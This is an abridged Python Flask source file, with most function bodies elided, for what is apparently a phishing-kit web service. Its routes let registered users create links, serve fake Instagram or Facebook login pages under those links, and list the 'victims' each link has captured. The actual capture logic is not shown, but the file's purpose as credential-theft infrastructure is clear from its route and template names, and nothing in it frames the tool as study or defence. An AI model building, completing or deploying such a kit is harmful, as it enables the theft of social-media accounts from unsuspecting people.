...
def register():
    ...
    return render_template_string(REGISTER_HTML.format(BASE_STYLE=BASE_STYLE))
...
def login():
    ...
    return render_template_string(LOGIN_HTML.format(BASE_STYLE=BASE_STYLE))
...
def dashboard():
    ...
    return render_template_string(DASHBOARD_HTML.format(BASE_STYLE=BASE_STYLE), user=session['username'], links=links, host_url=host_url)
...
def create_link():
    ...
    if request.method == 'POST':
        ...
        conn.close()
        return redirect(url_for('dashboard'))
    return render_template_string(CREATE_LINK_HTML.format(BASE_STYLE=BASE_STYLE))
...
def phish_page(link_id):
    ...
    if template_name == 'instagram':
        return render_template_string(INSTAGRAM_PAGE.format(BASE_STYLE=BASE_STYLE))
    else:
        return render_template_string(FACEBOOK_PAGE.format(BASE_STYLE=BASE_STYLE))
...
def view_victims(link_id):
    ...
    conn.close()
    return render_template_string(VICTIMS_HTML.format(BASE_STYLE=BASE_STYLE), link_id=link_id, victims=victims)
